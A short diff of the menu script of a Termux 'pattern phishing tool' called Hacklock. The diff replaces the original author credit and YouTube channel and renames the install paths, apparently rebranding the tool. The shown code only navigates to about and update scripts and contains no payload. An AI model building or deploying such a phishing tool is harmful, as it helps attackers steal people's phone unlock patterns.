@@ -39,8 +39,8 @@ clear
 
 
 #!/bin/bash
-# Hacklock by Nitro
-#youtube.com/noobhackers
+# Hacklock by SDMH-Hacking-TV 
+#youtube.com/SDMH-Hacking-TV
 #not for illegel use
 #pattern phishing tool for termux no root.
 
@@ -74,20 +74,20 @@ start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
 echo
-cd $HOME/hacklock/core/about/
+cd $HOME/Patternhack444/core/about/
 clear
 bash about.sh
 sleep 6.0
-cd $HOME/hacklock/
+cd $HOME/Patternhack444/
 bash hacklock.sh
 echo
 
 elif [[ $option == 3 || $option == 03 ]]; then
 echo
-cd $HOME/hacklock/core/update/
+cd $HOME/Patternhack444/core/update/
 bash update.sh
 sleep 6
-cd $HOME/hacklock/
+cd $HOME/Patternhack444/
 bash hacklock.sh
 echo
 elif [[ $option == 4 ]]; then
